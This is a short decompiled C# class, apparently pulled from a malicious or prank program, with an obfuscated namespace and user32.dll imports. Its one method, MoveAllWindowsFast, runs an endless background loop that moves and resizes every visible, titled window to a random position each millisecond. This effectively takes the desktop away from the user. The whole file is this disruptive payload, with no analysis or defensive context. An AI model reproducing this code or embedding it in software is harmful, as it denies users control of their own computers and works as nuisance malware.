using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace ṧ
{
	// Token: 0x02000004 RID: 4
	internal class CODE2
	{
		// Token: 0x0600003E RID: 62
		[DllImport("user32.dll")]
		private static extern bool EnumWindows(CODE2.EnumWindowsProc lpEnumFunc, IntPtr lParam);

		// Token: 0x0600003F RID: 63
		[DllImport("user32.dll")]
		private static extern bool IsWindowVisible(IntPtr hWnd);

		// Token: 0x06000040 RID: 64
		[DllImport("user32.dll")]
		private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

		// Token: 0x06000041 RID: 65
		[DllImport("user32.dll")]
		private static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);

		// Token: 0x06000042 RID: 66 RVA: 0x00002300 File Offset: 0x00000500
		public static void MoveAllWindowsFast()
		{
			new Thread(delegate()
			{
				Random rand = new Random();
				for (;;)
				{
					CODE2.EnumWindows(delegate(IntPtr hWnd, IntPtr lParam)
					{
						bool flag = CODE2.IsWindowVisible(hWnd);
						if (flag)
						{
							StringBuilder stringBuilder = new StringBuilder(256);
							CODE2.GetWindowText(hWnd, stringBuilder, stringBuilder.Capacity);
							string text = stringBuilder.ToString();
							bool flag2 = text != null && text.Trim().Length != 0;
							if (flag2)
							{
								CODE2.MoveWindow(hWnd, rand.Next(0, 500), rand.Next(0, 500), 800, 600, true);
							}
						}
						return true;
					}, IntPtr.Zero);
					Thread.Sleep(1);
				}
			})
			{
				IsBackground = true
			}.Start();
		}

		// Token: 0x02000029 RID: 41
		// (Invoke) Token: 0x060000C3 RID: 195
		private delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);
	}
}
